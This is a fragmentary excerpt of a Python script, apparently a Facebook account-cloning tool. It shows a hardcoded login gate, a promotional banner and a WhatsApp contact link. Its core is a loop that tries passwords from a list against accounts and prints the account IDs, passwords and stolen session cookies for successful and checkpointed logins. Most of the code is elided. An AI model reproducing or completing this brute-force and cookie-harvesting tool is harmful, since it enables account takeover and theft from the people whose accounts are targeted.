...
while attemps < 12345677901:
    ...
    if username == 'SIDDIK' and password == 'FIRE':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO SK SIDDIK KHAN  FIRE (🥰)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [ 5.5 ] FIRE (😻)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801831773688')
	elif MAMA in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SIDDIK-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SIDDIK-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				os.system('espeak -a 300 " SIDDIK,  Cp,  id"')
				...
				#SIDDIK-King
				print(f'\r\033[0;92m[SIDDIK-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SIDDIK,  Ok,  id"')
